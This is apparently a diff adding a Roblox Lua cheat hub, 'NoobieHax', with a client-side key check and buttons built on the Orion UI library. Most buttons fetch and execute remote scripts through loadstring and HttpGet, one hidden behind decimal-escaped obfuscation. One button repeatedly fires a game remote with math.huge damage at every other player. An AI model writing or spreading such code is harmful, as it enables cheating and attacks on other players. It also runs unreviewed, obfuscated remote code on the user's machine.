@@ -1,0 +1,159 @@
+-- / Key System \ --
+
+-- Booting Library
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+-- Values & Functions
+_G.Key = "eiekeiknd82kSIE91kjeAjem.Key"
+_G.KeyInput = "string"
+
+function CorrectKey()
+OrionLib:MakeNotification({
+	Name = "Key!",
+	Content = "You have entered the correct key!",
+	Image = "",
+	Time = 4
+})
+end
+
+
+-- Creating Window
+local Window = OrionLib:MakeWindow({Name = "Key System", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
+
+-- Tabs
+local tab1 = Window:MakeTab({
+	Name = "",
+	Icon = "",
+	PremiumOnly = false
+})
+
+-- Define tab1
+local section1 = tab1:AddSection({
+	Name = "Key"
+})
+
+tab1:AddTextbox({
+	Name = "Enter Key",
+	Default = "",
+	TextDisappear = false,
+	Callback = function(Value)
+		_G.KeyInput = Value
+	end	  
+})
+
+tab1:AddButton({
+	Name = "Check Key!",
+	Callback = function()
+            if _G.KeyInput == _G.Key then                
+                wait(0.5)
+                CorrectKey()
+            end
+  	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "FPS#0300 Creator.",
+	Callback = function()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Join the discord server for key!()",
+	Callback = function()
+      		print("button pressed")
+  	end    
+})
+
+
+function CorrectKey()
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "NoobieHax(KeyTest)", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+
+local Tab = Window:MakeTab({
+	Name = "Main",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddButton({
+	Name = "Revis Admin (FE, Universal)",
+	Callback = function()
+loadstring(game:HttpGetAsync("https://pastebin.com/raw/Caniwq2N"))()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Babft",
+	Callback = function()
+	local a,b,c = "juywvm","main","babft";loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/-Roblox-Projects-/%s/%s"):format(a, b, c)))()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Ghost hub(zombie attack)",
+	Callback = function()
+	loadstring(game:HttpGet('https://ghost-storage.7m.pl/scripts/ghosthublauncher.lua'))()
+      		print("button pressed")
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Worm 2048 script",
+	Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0worm", true))()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Wizzard tycoon script",
+	Callback = function()
+	while task.wait(0.1) do
+ for Index, Value in next, game.Players:GetPlayers() do
+  if (Value ~= game.Players.LocalPlayer and Value.Character and Value.Character:FindFirstChild("HumanoidRootPart")) then
+
+
+local args = {
+   [1] = CFrame.new(Value.Character.HumanoidRootPart.Position),
+   [2] = math.huge,
+   [3] = math.huge,
+   [4] = game:GetService("Players").LocalPlayer.Character.Wand,
+   [5] = math.huge,
+   [6] = game:GetService("Players").LocalPlayer.Character
+}
+
+game:GetService("Players").LocalPlayer.Character.Wand.Fire:FireServer(unpack(args))
+end end end
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "IV Admin (FE, Universal)",
+	Callback = function()
+	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\102\51\114\82\67\98\71\122\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
+      		print("button pressed")
+  	end    
+})
+
+Tab:AddButton({
+	Name = "",
+	Callback = function()
+	
+      		print("button pressed")
+  	end    
+})
+
+
+end
